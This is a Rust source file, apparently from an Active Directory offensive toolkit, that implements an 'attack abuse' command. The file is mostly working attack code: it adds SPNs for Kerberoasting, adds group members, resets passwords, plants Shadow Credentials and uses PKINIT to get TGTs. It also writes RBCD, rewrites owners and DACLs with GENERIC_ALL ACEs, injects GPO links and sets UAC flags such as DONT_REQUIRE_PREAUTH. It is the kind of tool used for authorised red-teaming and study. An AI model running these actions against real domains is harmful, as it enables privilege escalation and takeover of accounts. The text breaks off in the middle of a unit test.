//! Active LDAP-write abuse (add SPN / group member / password reset /
//! KeyCredential / RBCD / DACL rewrites) plus PKINIT — the exploitation
//! counterparts to the ACL findings the graph reports.

use adhammer_collector::{Collector, LdapConfig};
use anyhow::{Context, Result};
use clap::Parser;

/// LDAP-write / KDC abuse action for `attack abuse`.
///
/// Replaced a bare `--action <string>` in 1.3.10 — clap now rejects unknown
/// actions at parse time instead of running an LDAP bind first only to fail
/// with "unknown action 'foo'" later.
#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum AbuseAction {
    /// Add a servicePrincipalName to the target → makes it Kerberoastable.
    AddSpn,
    /// Add the given user to the target group.
    AddMember,
    /// Reset the target account's password (requires LDAPS or --gssapi sealing).
    SetPassword,
    /// Shadow Credentials: add a KeyCredential to msDS-KeyCredentialLink.
    AddKeycred,
    /// Write RBCD: allow --value to impersonate to the target (msDS-AllowedToActOnBehalfOfOtherIdentity).
    WriteRbcd,
    /// PKINIT with a previously issued Shadow Credentials key → TGT as the target account.
    Pkinit,
    /// WriteOwner: rewrite the Owner SID in target's nTSecurityDescriptor to --value.
    ///
    /// Reads the current SD (SD_FLAGS control), swaps only the Owner field, writes back.
    /// Owning an object grants implicit WriteDAC → full control via a second step.
    ///
    /// Rollback: `attack abuse --action write-owner --target <target> --value <original-owner-SID>`
    /// — but only if you captured the ORIGINAL owner before the write. Always run with
    /// `--dry-run` first and record the parsed owner from your recon dump.
    WriteOwner,
    /// WriteDacl: append a GENERIC_ALL allow-ACE for --value at position 0 of target's DACL.
    ///
    /// Reads the current SD, prepends the new ACE (highest priority — DACL entries evaluated
    /// in order), writes back. Grants full control without ownership change.
    ///
    /// Rollback: no clean single-command undo — you must restore the ORIGINAL DACL bytes.
    /// Capture `nTSecurityDescriptor` before running (a `--dry-run` diff of the current SD
    /// is emitted for exactly this reason), then `write_binary` the original hex back.
    WriteDacl,
    /// SetPrimaryGroup: set target's `primaryGroupID` to --value (a group RID or sAMAccountName).
    ///
    /// Abuses the "primary group is invisible in `memberOf`" quirk — stealthier than
    /// `add-member`, but the target must first appear in the group's `member` attribute
    /// (or already have the RID reachable via SidHistory) for AD to accept the write.
    ///
    /// Rollback: `attack abuse --action set-primary-group --target <target> --value 513`
    /// (513 = Domain Users default). Only accurate if you captured the ORIGINAL RID first
    /// via `--dry-run` — a service account may have been rid=515 (Domain Computers).
    SetPrimaryGroup,
    /// GpoLinkModify: append `[LDAP://cn={GUID},cn=policies,cn=system,<base>;0]` to --target
    /// OU's `gPLink`, attaching a controlled GPO you already staged.
    ///
    /// Reads the current gPLink text (may be empty), appends the new entry, writes back.
    /// Options byte defaults to `0` (link enabled, not enforced).
    ///
    /// Rollback: `attack abuse --action gpo-link-modify --target <ou> --value <GUID>` with
    /// `ADHAMMER_GPO_LINK_UNDO=1` is NOT implemented — undo means restoring the ORIGINAL
    /// gPLink string. Use `--dry-run` to capture the current value, then
    /// `Collector::modify_replace` the original string back through a manual invocation.
    GpoLinkModify,
    /// AllowedToAct: alias of `write-rbcd` — same attribute
    /// (msDS-AllowedToActOnBehalfOfOtherIdentity), red-team naming convention.
    ///
    /// Rollback: `attack abuse --action write-rbcd` on same target with a benign trustee,
    /// or (cleaner) `Collector::modify_replace` the attribute back to empty via an LDAP
    /// tool that supports Delete (adhammer's collector currently exposes Replace only).
    AllowedToAct,
    /// SetUacFlags: OR-in one or more UAC bits on --target's userAccountControl.
    ///
    /// Common bits (all uppercase, comma-separated in --value):
    ///   DONT_REQUIRE_PREAUTH       — enables AS-REP roasting
    ///   TRUSTED_FOR_DELEGATION     — enables Unconstrained Delegation
    ///   TRUSTED_TO_AUTH_FOR_DELEGATION — enables S4U protocol transition
    ///   DONT_EXPIRE_PASSWORD       — password never expires
    ///   ACCOUNTDISABLE             — disables the account
    ///   PASSWD_NOTREQD             — no password required
    ///
    /// Rollback: `attack abuse --action set-uac-flags --target <account> --value <original-bits>`
    /// — requires knowing the original value. Use --dry-run to capture first.
    SetUacFlags,
}

#[derive(Parser)]
pub(crate) struct AbuseArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::OptAuth,
    /// Which abuse to perform.
    #[arg(long)]
    pub action: AbuseAction,
    /// Target sAMAccountName (the object to modify; the group for add-member; the account
    /// to authenticate as for `pkinit`; the OU for gpo-link-modify)
    #[arg(long)]
    pub target: String,
    /// Value: the SPN, member sAMAccountName, new password, RBCD trustee, or (for `pkinit`)
    /// the key .pem path — defaults to `<target>.key.pem`
    #[arg(long, default_value = "")]
    pub value: String,
    /// Kerberos realm (pkinit); also the AD DNS domain for --ldap389 base DN
    #[arg(long)]
    pub realm: Option<String>,
    /// KDC `host[:port]` (pkinit)
    #[arg(long)]
    pub kdc: Option<String>,
    /// add-keycred over raw LDAP-389 + NTLM SASL bind (no LDAPS) — needs --host + --realm
    #[arg(long)]
    pub ldap389: bool,
    /// DC host for --ldap389
    #[arg(long)]
    pub host: Option<String>,
    /// Show what the write would send (SD hex, LDAP modify record) without executing it.
    /// Every write action gates on this: with `--dry-run` we print the payload and return
    /// before calling any `Collector::modify_*` / `write_binary`. Safe against a live DC.
    #[arg(long)]
    pub dry_run: bool,
}

/// Active LDAP abuse — the exploitation counterpart to the ACL findings the graph reports.
pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
    // AbuseArgs.auth.password is Option<String>; resolve through the same @file: / env /
    // TTY-prompt cascade as every other subcommand. `resolve_secret` returns "" when
    // nothing is available; downstream code turns that into a "needs --password" error
    // for the actions that require one (pkinit branches on the key .pem instead).
    {
        let cur = a.auth.password.as_deref().unwrap_or("");
        let resolved = crate::resolve_secret(cur, "ADHAMMER_PASSWORD")?;
        if !resolved.is_empty() {
            a.auth.password = Some(resolved);
        }
    }
    // pkinit is a KDC exchange, not an LDAP write — handle it before touching LDAP.
    if a.action == AbuseAction::Pkinit {
        let realm = a.realm.clone().context("pkinit needs --realm")?;
        let kdc = a.kdc.clone().context("pkinit needs --kdc")?;
        let key_path = if a.value.is_empty() {
            format!("{}.key.pem", a.target)
        } else {
            a.value.clone()
        };
        let pem =
            std::fs::read_to_string(&key_path).with_context(|| format!("read key {key_path}"))?;
        let tgt =
            adhammer_kerberos::pkinit::pkinit_authenticate(&a.target, &realm, &kdc, &pem).await?;
        let cc_path = format!("{}.ccache", a.target);
        std::fs::write(&cc_path, tgt.ccache.expose())?;
        println!(
            "[+] PKINIT succeeded — TGT for {}@{} (via {})",
            a.target, realm, tgt.sname
        );
        println!("    reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key)");
        println!("    ticket valid until {}", tgt.end_time);
        println!("    ccache saved to {cc_path}  (export KRB5CCNAME={cc_path})");
        return Ok(());
    }

    // add-keycred over raw LDAP-389 + NTLM SASL (no LDAPS) — also the relay code path.
    if a.ldap389 {
        let host = a.host.clone().context("--ldap389 needs --host")?;
        let realm = a.realm.clone().context("--ldap389 needs --realm")?;
        let user = a.auth.user.clone().context("--ldap389 needs --user")?;
        let password = a
            .auth
            .password
            .clone()
            .context("--ldap389 needs --password")?;
        let bare = user
            .split('@')
            .next()
            .unwrap_or(&user)
            .rsplit('\\')
            .next()
            .unwrap_or(&user)
            .to_string();
        let base: String = realm
            .split('.')
            .map(|p| format!("DC={p}"))
            .collect::<Vec<_>>()
            .join(",");
        let mut ld = adhammer_ldap::LdapClient::connect(&format!("{host}:389")).await?;
        ld.bind_ntlm(&realm, &bare, &password, "ADHAMMER").await?;
        let dn = ld.find_dn(&base, &a.target).await?;
        let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
        if a.dry_run {
            println!(
                "[dry-run] would write attribute=msDS-KeyCredentialLink target={dn} value={} (dn-binary)",
                kc.dn_binary
            );
            println!("[dry-run] no change made");
            return Ok(());
        }
        ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
            .await?;
        std::fs::write(format!("{}.key.pem", a.target), &kc.private_key_pem)?;
        println!("[+] LDAP-389 (NTLM SASL) add-keycred on {dn}");
        println!(
            "    key saved to {}.key.pem — Phase 2: attack abuse --action pkinit --target {}",
            a.target, a.target
        );
        return Ok(());
    }

    let cfg = LdapConfig {
        url: a.auth.url.clone().context("this action needs --url")?,
        bind_dn: a.auth.user.clone().context("this action needs --user")?,
        password: a
            .auth
            .password
            .clone()
            .context("this action needs --password")?,
        base_dn: None,
        insecure: a.auth.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    // ux-2: accept SID / sAMAccountName / DN — classify() dispatches to the right resolver.
    let target_dn = crate::target::to_dn(&mut c, &a.target).await?;

    match a.action {
        AbuseAction::AddSpn => {
            if a.dry_run {
                dry_run_line("servicePrincipalName", &target_dn, &a.value);
                return Ok(());
            }
            c.add_value(&target_dn, "servicePrincipalName", &a.value)
                .await?;
            println!(
                "[+] added SPN '{}' to {} — now Kerberoastable",
                a.value, a.target
            );
        }
        AbuseAction::AddMember => {
            let member_dn = crate::target::to_dn(&mut c, &a.value).await?;
            if a.dry_run {
                dry_run_line("member", &target_dn, &member_dn);
                return Ok(());
            }
            c.add_value(&target_dn, "member", &member_dn).await?;
            println!("[+] added {} to group {}", a.value, a.target);
        }
        AbuseAction::SetPassword => {
            // AD refuses `unicodePwd` writes on an unencrypted channel — save the user a
            // WILL_NOT_PERFORM roundtrip by front-checking the URL and telling them why.
            let url = a.auth.url.as_deref().unwrap_or("");
            if url.starts_with("ldap://") {
                anyhow::bail!(
                    "set-password requires an encrypted LDAP channel — use `ldaps://` \
                     (add --insecure for self-signed) or --gssapi with SASL sealing. \
                     Plain ldap:// will always fail with WILL_NOT_PERFORM (0x5003)."
                );
            }
            if a.dry_run {
                dry_run_line("unicodePwd", &target_dn, "<UTF-16LE-encoded, redacted>");
                return Ok(());
            }
            c.set_password(&target_dn, &a.value).await?;
            println!("[+] reset password of {}", a.target);
        }
        AbuseAction::AddKeycred => {
            // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
            let kc = adhammer_kerberos::shadowcred::build_key_credential(&target_dn)?;
            if a.dry_run {
                dry_run_line("msDS-KeyCredentialLink", &target_dn, &kc.dn_binary);
                return Ok(());
            }
            c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary)
                .await?;
            let key_path = format!("{}.key.pem", a.target);
            std::fs::write(&key_path, &kc.private_key_pem)?;
            println!(
                "[+] added Shadow Credential to {} — key saved to {key_path}",
                a.target
            );
            println!(
                "    (Phase 2: PKINIT with this key to obtain a TGT as {})",
                a.target
            );
        }
        AbuseAction::WriteRbcd | AbuseAction::AllowedToAct => {
            // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
            let trustee = crate::target::to_sid(&mut c, &a.value).await?;
            let sd = windows_sddl::build_rbcd_sd(&trustee);
            if a.dry_run {
                dry_run_line(
                    "msDS-AllowedToActOnBehalfOfOtherIdentity",
                    &target_dn,
                    &format!("<{}-byte SD, hex={}>", sd.len(), hex_of(&sd)),
                );
                return Ok(());
            }
            c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd)
                .await?;
            println!(
                "[+] wrote RBCD on {} allowing {} to impersonate to it",
                a.target, a.value
            );
        }
        AbuseAction::WriteOwner => {
            // Rewrite Owner in nTSecurityDescriptor. Reads existing SD (SD_FLAGS control),
            // splices new owner bytes at the header offset, writes back.
            let trustee = crate::target::to_sid(&mut c, &a.value).await?;
            let cur = c
                .read_binary(&target_dn, "nTSecurityDescriptor")
                .await?
                .context("target has no readable nTSecurityDescriptor")?;
            let new_sd =
                swap_owner_in_sd(&cur, &trustee.to_bytes()).context("splice new owner into SD")?;
            if a.dry_run {
                dry_run_line(
                    "nTSecurityDescriptor",
                    &target_dn,
                    &format!(
                        "<{}-byte SD, new-owner={}, hex={}>",
                        new_sd.len(),
                        trustee,
                        hex_of(&new_sd)
                    ),
                );
                return Ok(());
            }
            c.write_binary(&target_dn, "nTSecurityDescriptor", new_sd)
                .await?;
            println!("[+] wrote Owner={} on {}", trustee, target_dn);
        }
        AbuseAction::WriteDacl => {
            // Prepend a GENERIC_ALL allow-ACE for the trustee. DACL entries are evaluated
            // in order — position 0 wins over any subsequent deny.
            let trustee = crate::target::to_sid(&mut c, &a.value).await?;
            let cur = c
                .read_binary(&target_dn, "nTSecurityDescriptor")
                .await?
                .context("target has no readable nTSecurityDescriptor")?;
            let new_sd = prepend_generic_all_ace(&cur, &trustee.to_bytes())
                .context("splice GENERIC_ALL ACE into DACL")?;
            if a.dry_run {
                dry_run_line(
                    "nTSecurityDescriptor",
                    &target_dn,
                    &format!(
                        "<{}-byte SD, +GENERIC_ALL for {}, hex={}>",
                        new_sd.len(),
                        trustee,
                        hex_of(&new_sd)
                    ),
                );
                return Ok(());
            }
            c.write_binary(&target_dn, "nTSecurityDescriptor", new_sd)
                .await?;
            println!(
                "[+] appended GENERIC_ALL ACE for {} on {} DACL",
                trustee, target_dn
            );
        }
        AbuseAction::SetPrimaryGroup => {
            // --value = numeric RID (e.g. 512 for Domain Admins) OR a group sAM whose
            // objectSid RID we look up.
            let rid: u32 = if let Ok(n) = a.value.parse::<u32>() {
                n
            } else {
                let sid = c
                    .resolve_sid(&a.value)
                    .await
                    .with_context(|| format!("resolve group {:?} to SID", a.value))?;
                *sid.sub_authorities
                    .last()
                    .context("group SID has no sub-authorities → no RID to extract")?
            };
            if a.dry_run {
                dry_run_line("primaryGroupID", &target_dn, &rid.to_string());
                return Ok(());
            }
            c.modify_replace(&target_dn, "primaryGroupID", &rid.to_string())
                .await?;
            println!(
                "[+] set primaryGroupID={} on {} — now inherits that group's membership",
                rid, a.target
            );
        }
        AbuseAction::SetUacFlags => {
            let add_bits = parse_uac_flags(&a.value)
                .with_context(|| format!("--value {:?} — parse UAC flag names", a.value))?;
            let cur_text = c
                .read_text(&target_dn, "userAccountControl")
                .await?
                .context("target has no readable userAccountControl")?;
            let cur: u32 = cur_text
                .parse()
                .with_context(|| format!("userAccountControl {cur_text:?} not a u32"))?;
            let new = cur | add_bits;
            if a.dry_run {
                println!(
                    "[dry-run] would write userAccountControl={:#010x} (was {:#010x}) on {}",
                    new, cur, target_dn
                );
                println!("[dry-run] no change made");
                return Ok(());
            }
            c.modify_replace(&target_dn, "userAccountControl", &new.to_string())
                .await?;
            println!(
                "[+] set userAccountControl={:#010x} (was {:#010x}) on {}",
                new, cur, a.target
            );
        }
        AbuseAction::GpoLinkModify => {
            // Read current gPLink text (may be empty). Append the new link entry.
            // Full form: `[LDAP://cn={GUID},cn=policies,cn=system,<base>;0]`.
            let guid = normalize_gpo_guid(&a.value);
            let base = c.base_dn().to_string();
            let entry = format_gplink_entry(&guid, &base);
            let cur = c.read_text(&target_dn, "gPLink").await?.unwrap_or_default();
            let combined = if cur.is_empty() {
                entry.clone()
            } else {
                format!("{cur}{entry}")
            };
            if a.dry_run {
                dry_run_line("gPLink", &target_dn, &combined);
                return Ok(());
            }
            c.modify_replace(&target_dn, "gPLink", &combined).await?;
            println!("[+] linked GPO {} to OU {}", guid, target_dn);
        }
        AbuseAction::Pkinit => unreachable!("pkinit handled above the LDAP-connect block"),
    }
    Ok(())
}

// ─────────────────────────── pure helpers ───────────────────────────

/// `[dry-run] …` line printed instead of executing a write. Matches the plan spec.
fn dry_run_line(attr: &str, target: &str, value: &str) {
    println!("[dry-run] would write attribute={attr} target={target} value={value}");
    println!("[dry-run] no change made");
}

/// Hex-encode a byte slice, uppercase, no separators — for `--dry-run` SD dumps.
fn hex_of(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for byte in b {
        use std::fmt::Write as _;
        let _ = write!(s, "{byte:02X}");
    }
    s
}

/// Comma-separated UAC bit names → OR'd bitmask. Accepts hex (`0x400000`),
/// decimal, and the standard MS-ADTS §2.2.16 mnemonics. Empty tokens ignored.
fn parse_uac_flags(raw: &str) -> anyhow::Result<u32> {
    let mut bits: u32 = 0;
    for tok in raw.split(',').map(|s| s.trim()).filter(|s| !s.is_empty()) {
        let name = tok.to_ascii_uppercase();
        let v = match name.as_str() {
            "SCRIPT" => 0x0000_0001,
            "ACCOUNTDISABLE" => 0x0000_0002,
            "HOMEDIR_REQUIRED" => 0x0000_0008,
            "LOCKOUT" => 0x0000_0010,
            "PASSWD_NOTREQD" => 0x0000_0020,
            "PASSWD_CANT_CHANGE" => 0x0000_0040,
            "ENCRYPTED_TEXT_PWD_ALLOWED" => 0x0000_0080,
            "TEMP_DUPLICATE_ACCOUNT" => 0x0000_0100,
            "NORMAL_ACCOUNT" => 0x0000_0200,
            "INTERDOMAIN_TRUST_ACCOUNT" => 0x0000_0800,
            "WORKSTATION_TRUST_ACCOUNT" => 0x0000_1000,
            "SERVER_TRUST_ACCOUNT" => 0x0000_2000,
            "DONT_EXPIRE_PASSWORD" => 0x0001_0000,
            "MNS_LOGON_ACCOUNT" => 0x0002_0000,
            "SMARTCARD_REQUIRED" => 0x0004_0000,
            "TRUSTED_FOR_DELEGATION" => 0x0008_0000,
            "NOT_DELEGATED" => 0x0010_0000,
            "USE_DES_KEY_ONLY" => 0x0020_0000,
            "DONT_REQUIRE_PREAUTH" => 0x0040_0000,
            "PASSWORD_EXPIRED" => 0x0080_0000,
            "TRUSTED_TO_AUTH_FOR_DELEGATION" => 0x0100_0000,
            "PARTIAL_SECRETS_ACCOUNT" => 0x0400_0000,
            _ => {
                if let Some(hex) = name.strip_prefix("0X") {
                    u32::from_str_radix(hex, 16)
                        .with_context(|| format!("unknown UAC flag {tok:?}"))?
                } else if name.chars().all(|c| c.is_ascii_digit()) {
                    name.parse::<u32>()
                        .with_context(|| format!("unknown UAC flag {tok:?}"))?
                } else {
                    anyhow::bail!("unknown UAC flag {tok:?}");
                }
            }
        };
        bits |= v;
    }
    if bits == 0 {
        anyhow::bail!("set-uac-flags needs --value <FLAG[,FLAG...]> (empty)");
    }
    Ok(bits)
}

/// Normalize a GPO GUID string to `{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}` (uppercase braces).
fn normalize_gpo_guid(raw: &str) -> String {
    let trimmed = raw.trim().trim_matches(|c| c == '{' || c == '}');
    format!("{{{}}}", trimmed.to_uppercase())
}

/// One gPLink entry: `[LDAP://cn=<GUID>,cn=policies,cn=system,<base>;0]`.
/// Options byte 0 = enabled + not enforced (see MS-GPOL §2.2.2).
fn format_gplink_entry(guid: &str, base_dn: &str) -> String {
    format!("[LDAP://cn={guid},cn=policies,cn=system,{base_dn};0]")
}

/// SECURITY_DESCRIPTOR_RELATIVE header layout (MS-DTYP §2.4.6):
///     [0]  Revision(1) [1] Sbz1(1) [2..4] Control(2) LE
///     [4..8]   OwnerOffset  LE
///     [8..12]  GroupOffset  LE
///     [12..16] SaclOffset   LE
///     [16..20] DaclOffset   LE
/// Then variable-length payloads at those offsets. Splice-based rewrites below
/// preserve sections we don't touch by copying their original raw bytes.
const SD_HEADER_LEN: usize = 20;

/// Length of the SID starting at `b[off]` — 8 header bytes + 4 per sub-authority.
fn sid_len_at(b: &[u8], off: usize) -> Option<usize> {
    let count = *b.get(off + 1)? as usize;
    Some(8 + count * 4)
}

/// Length of the ACL at `b[off]` — its own AclSize field (offset+2, u16 LE).
fn acl_len_at(b: &[u8], off: usize) -> Option<usize> {
    Some(u16::from_le_bytes([*b.get(off + 2)?, *b.get(off + 3)?]) as usize)
}

fn read_u32_le(b: &[u8], off: usize) -> Option<u32> {
    Some(u32::from_le_bytes([
        *b.get(off)?,
        *b.get(off + 1)?,
        *b.get(off + 2)?,
        *b.get(off + 3)?,
    ]))
}

/// Parsed sections of a self-relative SD. Empty `Vec`s mean the section
/// wasn't present (offset zero in the header). The `control` word is preserved
/// so callers can adjust individual flag bits (SE_OWNER_DEFAULTED etc.).
struct SdParts {
    revision: u8,
    control: u16,
    owner: Vec<u8>,
    group: Vec<u8>,
    sacl: Vec<u8>,
    dacl: Vec<u8>,
}

/// Extract owner/group/sacl/dacl from a self-relative SD, treating missing
/// sections as empty. Returns `None` on a malformed input.
fn parse_sd_sections(b: &[u8]) -> Option<SdParts> {
    if b.len() < SD_HEADER_LEN {
        return None;
    }
    let revision = b[0];
    let control = u16::from_le_bytes([b[2], b[3]]);
    let owner_off = read_u32_le(b, 4)? as usize;
    let group_off = read_u32_le(b, 8)? as usize;
    let sacl_off = read_u32_le(b, 12)? as usize;
    let dacl_off = read_u32_le(b, 16)? as usize;

    let slice_section = |off: usize, len: Option<usize>| -> Option<Vec<u8>> {
        if off == 0 {
            Some(Vec::new())
        } else {
            let l = len?;
            Some(b.get(off..off + l)?.to_vec())
        }
    };
    Some(SdParts {
        revision,
        control,
        owner: slice_section(owner_off, sid_len_at(b, owner_off))?,
        group: slice_section(group_off, sid_len_at(b, group_off))?,
        sacl: slice_section(sacl_off, acl_len_at(b, sacl_off))?,
        dacl: slice_section(dacl_off, acl_len_at(b, dacl_off))?,
    })
}

/// Reassemble a self-relative SD from raw section bytes. Section order:
/// owner, group, sacl, dacl (matches ldap3's typical DC output; readers only
/// care about the header offsets, so any order is spec-legal).
fn build_sd(
    revision: u8,
    control: u16,
    owner: &[u8],
    group: &[u8],
    sacl: &[u8],
    dacl: &[u8],
) -> Vec<u8> {
    let mut sd =
        Vec::with_capacity(SD_HEADER_LEN + owner.len() + group.len() + sacl.len() + dacl.len());
    sd.push(revision);
    sd.push(0); // Sbz1
    sd.extend_from_slice(&control.to_le_bytes());
    // Offsets computed as sections are appended.
    let mut cur = SD_HEADER_LEN as u32;
    let owner_off = if !owner.is_empty() {
        let off = cur;
        cur += owner.len() as u32;
        off
    } else {
        0
    };
    let group_off = if !group.is_empty() {
        let off = cur;
        cur += group.len() as u32;
        off
    } else {
        0
    };
    let sacl_off = if !sacl.is_empty() {
        let off = cur;
        cur += sacl.len() as u32;
        off
    } else {
        0
    };
    let dacl_off = if !dacl.is_empty() {
        let off = cur;
        cur += dacl.len() as u32;
        off
    } else {
        0
    };
    let _ = cur; // suppress unused_variables
    sd.extend_from_slice(&owner_off.to_le_bytes());
    sd.extend_from_slice(&group_off.to_le_bytes());
    sd.extend_from_slice(&sacl_off.to_le_bytes());
    sd.extend_from_slice(&dacl_off.to_le_bytes());
    sd.extend_from_slice(owner);
    sd.extend_from_slice(group);
    sd.extend_from_slice(sacl);
    sd.extend_from_slice(dacl);
    sd
}

/// Replace the Owner SID of a self-relative SD. Preserves group, sacl, dacl and
/// the Control flags (SE_OWNER_DEFAULTED is cleared — the new owner is explicit).
/// Returns `None` on a malformed input.
pub(crate) fn swap_owner_in_sd(sd: &[u8], new_owner_sid: &[u8]) -> Option<Vec<u8>> {
    let p = parse_sd_sections(sd)?;
    // Clear SE_OWNER_DEFAULTED (0x0001) — the new owner is explicitly assigned.
    let control = p.control & !0x0001;
    Some(build_sd(
        p.revision,
        control,
        new_owner_sid,
        &p.group,
        &p.sacl,
        &p.dacl,
    ))
}

/// Build an ACCESS_ALLOWED_ACE (type 0x00) granting GENERIC_ALL (0x1000_0000) to `trustee_sid`.
/// Layout: Type(1) Flags(1) Size(2) Mask(4) SID(variable). Size = 8 + SID length.
fn build_generic_all_ace(trustee_sid: &[u8]) -> Vec<u8> {
    let mut ace = Vec::with_capacity(8 + trustee_sid.len());
    ace.push(0x00); // ACCESS_ALLOWED_ACE_TYPE
    ace.push(0x00); // AceFlags — non-inheritable
    let size = (8 + trustee_sid.len()) as u16;
    ace.extend_from_slice(&size.to_le_bytes());
    ace.extend_from_slice(&0x1000_0000u32.to_le_bytes()); // GENERIC_ALL
    ace.extend_from_slice(trustee_sid);
    ace
}

/// Prepend an ACCESS_ALLOWED_ACE granting GENERIC_ALL to `new_trustee_sid` at DACL
/// position 0 (highest priority). If the target has no DACL yet (SD_FLAGS returned
/// no DACL, or the object is a "no security descriptor" edge case), a fresh
/// single-ACE DACL is synthesised.
pub(crate) fn prepend_generic_all_ace(sd: &[u8], new_trustee_sid: &[u8]) -> Option<Vec<u8>> {
    let mut p = parse_sd_sections(sd)?;
    let ace = build_generic_all_ace(new_trustee_sid);

    let new_dacl = if p.dacl.is_empty() {
        // Synthesize: revision 2, size = 8 + ace.len(), count 1.
        let mut d = Vec::with_capacity(8 + ace.len());
        d.push(0x02); // AclRevision (2 for non-object ACEs)
        d.push(0x00);
        let dacl_size = (8 + ace.len()) as u16;
        d.extend_from_slice(&dacl_size.to_le_bytes());
        d.extend_from_slice(&1u16.to_le_bytes()); // AceCount
        d.extend_from_slice(&0u16.to_le_bytes()); // Sbz2
        d.extend_from_slice(&ace);
        // Ensure SE_DACL_PRESENT (0x0004) is set.
        p.control |= 0x0004;
        d
    } else {
        // Read existing header, splice new ACE in front of existing ACEs.
        let existing_size = u16::from_le_bytes([p.dacl[2], p.dacl[3]]) as usize;
        let existing_count = u16::from_le_bytes([p.dacl[4], p.dacl[5]]);
        let existing_ace_bytes = &p.dacl[8..existing_size];
        let mut d = Vec::with_capacity(8 + ace.len() + existing_ace_bytes.len());
        d.push(p.dacl[0]); // preserve AclRevision (may be 4 for object ACEs)
        d.push(p.dacl[1]);
        let new_size = (8 + ace.len() + existing_ace_bytes.len()) as u16;
        d.extend_from_slice(&new_size.to_le_bytes());
        let new_count = existing_count.checked_add(1)?;
        d.extend_from_slice(&new_count.to_le_bytes());
        d.extend_from_slice(&0u16.to_le_bytes()); // Sbz2
        d.extend_from_slice(&ace);
        d.extend_from_slice(existing_ace_bytes);
        d
    };
    // Clear SE_DACL_DEFAULTED (0x0008) — explicitly modified.
    p.control &= !0x0008;
    Some(build_sd(
        p.revision, p.control, &p.owner, &p.group, &p.sacl, &new_dacl,
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ba_sid() -> Vec<u8> {
        // S-1-5-32-544 (BUILTIN\Administrators)
        adhammer_core::sid::Sid {
            revision: 1,
            identifier_authority: 5,
            sub_authorities: vec![32, 544],
        }
        .to_bytes()
    }

    fn user_sid() -> Vec<u8> {
        adhammer_core::sid::Sid {
            revision: 1,
            identifier_authority: 5,
            sub_authorities: vec![21, 1, 2, 3, 1104],
        }
        .to_bytes()
    }

    #[test]
    fn owner_swap_round_trips() {
        // Start from an RBCD-shaped SD (owner=BA, group=BA, one allow ACE for user_sid).
        let orig = windows_sddl::build_rbcd_sd(&windows_sddl::Sid {
            revision: 1,
            identifier_authority: 5,
            sub_authorities: vec![21, 1, 2, 3, 1104],
        });
        // Owner is BA in the original — swap to user_sid.
        let new_sd = swap_owner_in_sd(&orig, &user_sid()).expect("splice owner");
        let parsed = windows_sddl::parse(&new_sd).expect("parse rebuilt SD");
        let new_owner = parsed.owner.expect("owner present");
        assert_eq!(
            new_owner.sub_authorities,
            vec![21, 1, 2, 3, 1104],
            "owner sub-authorities preserved after swap"
        );
        // DACL survives — still exactly one allow-ACE with GENERIC_ALL bit within mask.
        let aces = parsed.dacl.expect("dacl").aces;
        assert_eq!(aces.len(), 1);
        assert!(aces[0].is_allow());
    }

    #[test]
    fn owner_swap_rejects_short_input() {
        assert!(swap_owner_in_sd(&[0u8; 4], &user_sid()).is_none());
    }

    #[test]
    fn generic_all_ace_layout() {
        let ace = build_generic_all_ace(&user_sid());
        // Header: type 0x00, flags 0x00, size = 8 + sid_len.
        assert_eq!(ace[0], 0x00);
        assert_eq!(ace[1], 0x00);
        let size = u16::from_le_bytes([ace[2], ace[3]]);
        assert_eq!(size as usize, ace.len());
        assert_eq!(size as usize, 8 + user_sid().len());
        // Mask == GENERIC_ALL (0x10000000).
        let mask = u32::from_le_bytes([ace[4], ace[5], ace[6], ace[7]]);
        assert_eq!(mask, 0x1000_0000);
        // SID bytes appended after mask.
        assert_eq!(&ace[8..], &user_sid()[..]);
    }

    #[test]
    fn prepend_ace_grows_dacl_and_reparses() {
        let orig = windows_sddl::build_rbcd_sd(&windows_sddl::Sid {
            revision: 1,
            identifier_authority: 5,
            sub_authorities: vec![21, 1, 2, 3, 1104],
        });
        let orig_parsed = windows_sddl::parse(&orig).unwrap();
        let orig_count = orig_parsed.dacl.unwrap().aces.len();

        let new_sd = prepend_generic_all_ace(&orig, &ba_sid()).expect("prepend ACE");
        let parsed = windows_sddl::parse(&new_sd).expect("parse rebuilt SD");
        let aces = parsed.dacl.expect("dacl").aces;
        assert_eq!(aces.len(), orig_count + 1, "one ACE added");
        // Position 0 is our new ACE — trustee should be BA.
        assert!(aces[0].is_allow());
        assert_eq!(aces[0].trustee.sub_authorities, vec![32, 544]);
    }

    #[test]
    fn prepend_ace_on_empty_dacl_synthesizes_one() {
        // Minimal self-relative SD with no owner/group/sacl/dacl (all offsets zero).
        let mut sd = vec![1u8, 0, 0, 0]; // rev=1, sbz1=0, control=0
        sd.extend_from_slice(&0u32.to_le_bytes());
        sd.extend_from_slice(&0u32.to_le_bytes());
        sd.extend_from_slice(&0u32.to_le_bytes());
        sd.extend_from_slice(&0u32.to_le_bytes());
        let new_sd = prepend_generic_all_ace(&sd, &user_sid()).expect("synthesize DACL");
        // Control flags now carry SE_DACL_PRESENT (0x0004).
        let control = u16::from_le_bytes([new_sd[2], new_sd[3]]);
        assert!(control & 0x0004 != 0);
        let parsed = windows_sddl::parse(&new_sd).unwrap();
        let aces = parsed.dacl.unwrap().aces;
        assert_eq!(aces.len(), 1);
        assert_eq!(aces[0].trustee.sub_authorities, vec![21, 1, 2, 3, 1104]);
    }

    #[test]
    fn gplink_entry_shape() {
        let entry = format_gplink_entry("{AB-CD}", "DC=lab,DC=local");
        assert_eq!(
            entry,
            "[LDAP://cn={AB-CD},cn=policies,cn=system,DC=lab,DC=local;0]"
        );
    }

    #[test]
    fn parse_uac_flags_or_and_hex() {
        // Mnemonic OR
        assert_eq!(
            parse_uac_flags("DONT_REQUIRE_PREAUTH, TRUSTED_FOR_DELEGATION").unwrap(),
